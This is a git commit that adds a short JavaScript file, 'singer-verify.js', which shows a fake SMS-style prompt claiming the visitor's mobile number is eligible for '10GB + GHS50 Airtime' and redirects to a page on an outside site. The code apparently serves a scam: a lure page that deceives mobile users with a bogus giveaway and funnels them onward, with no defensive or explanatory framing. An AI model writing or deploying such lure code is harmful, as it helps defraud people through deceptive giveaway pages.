0956f2ba4e4ef3f6108811982f0859ca353c6ed9
newblog13 <sweet16guyz@gmail.com>
2026-05-26 09:38:40 +0100

    Create singer-verify.js

---
+++ singer-verify.js
@@ -0,0 +1,5 @@
+var password = '10GB + GHS50 Airtime'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 10GB + GHS50 Airtime, click OK to Activate now','10GB + GHS50 Airtime');
+if (password != '10GB + GHS50 Airtime') {
+location.href='https://phivez.org/black-sherif.html';
+}
